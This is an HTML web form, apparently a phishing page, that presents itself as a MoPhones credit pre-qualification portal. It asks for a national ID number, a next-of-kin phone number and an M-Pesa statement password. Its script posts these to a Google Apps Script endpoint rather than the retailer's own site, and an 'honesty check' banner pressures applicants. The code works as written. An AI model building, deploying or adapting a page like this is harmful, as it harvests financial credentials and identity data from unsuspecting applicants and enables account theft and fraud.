<!DOCTYPE html>
<html lang="en">
<head>
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '852047494123267');
    fbq('track', 'PageView');
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoPhones Credit Pre-Qualification</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); max-width: 600px; margin: auto; }
        h2 { color: #004488; border-bottom: 2px solid #004488; padding-bottom: 10px; }
        .disclaimer { border: 2px solid #004488; padding: 15px; margin-bottom: 20px; background-color: #f0f8ff; color: #333; font-weight: bold; }
        input[type="text"], input[type="tel"], select { width: 100%; padding: 12px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        input[type="submit"] { background-color: #004488; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1.1em; font-weight: bold; }
        input[type="submit"]:hover { background-color: #0056b3; }
        .contact-us { text-align: center; margin-top: 20px; }
        .error-msg { color: red; font-size: 0.9em; display: none; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="container">
    <div style="text-align: center; margin-bottom: 20px;">
        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" alt="MoPhones Logo" style="max-width: 150px;">
    </div>
    <h2>MoPhones Credit Pre-Qualification</h2>
    <p>Check pricing at <a href="https://mophones.co" target="_blank">mophones.co</a></p>

    <div class="disclaimer">
        ðŸ›‘ <b>HONESTY CHECK:</b> Dishonesty about past loans results in immediate disqualification.
    </div>

    <form name="submit-to-google-sheet" id="portalForm">
        <label for="full_name"><b>Full Name (As per ID)</b></label>
        <input type="text" id="full_name" name="full_name" placeholder="John Doe" required>

        <label for="id_number"><b>National ID Number</b></label>
        <input type="text" id="id_number" name="id_number" placeholder="12345678" required>

        <label for="preferred_phone"><b>Preferred Phone Model</b></label>
        <input type="text" id="preferred_phone" name="preferred_phone" placeholder="e.g. Samsung A42" required>

        <label for="region"><b>Region</b></label>
        <select id="region" name="region" required>
            <option value="" disabled selected>Select Location</option>
            <option value="nairobi">Nairobi County</option>
            <option value="kiambu">Kiambu County</option>
            <option value="nakuru">Nakuru Town</option>
            <option value="machakos">Machakos</option>
        </select>

        <label for="nok_contact"><b>Next of Kin Contact Number</b></label>
        <input type="tel" id="nok_contact" name="nok_contact" placeholder="0712345678" required>

        <label for="mpesa_password"><b>M-Pesa Statement Password</b></label>
        <input type="text" id="mpesa_password" name="mpesa_password" required>

        <div id="errorBox" class="error-msg">Please check your details and try again.</div>

        <input type="submit" value="Submit Application">
    </form>
</div>

<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzxoZV-BC7jYgCwuR4y9SVgALBMqLWWoIfH889LpnC-BagmGhT6cHmZwSZI4icGq03o/exec';
  const form = document.forms['submit-to-google-sheet'];
  const errorBox = document.getElementById('errorBox');

  form.addEventListener('submit', e => {
    e.preventDefault();
    errorBox.style.display = 'none';

    // SIMPLE VALIDATION LOGIC
    const idNum = document.getElementById('id_number').value;
    const nokPhone = document.getElementById('nok_contact').value;

    if (idNum.length < 7 || idNum.length > 10) {
        alert("Invalid ID Number. Please check again.");
        return;
    }

    if (nokPhone.length < 10) {
        alert("Please enter a valid phone number.");
        return;
    }

    alert("Submitting to MoPhones Portal... please wait.");

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => {
          alert("SUCCESS! Your application is in the system.");
          form.reset();
      })
      .catch(error => {
          console.error('Error!', error.message);
          alert("Submission failed. Check your internet and try again.");
      });
  });
</script>

</body>
</html>
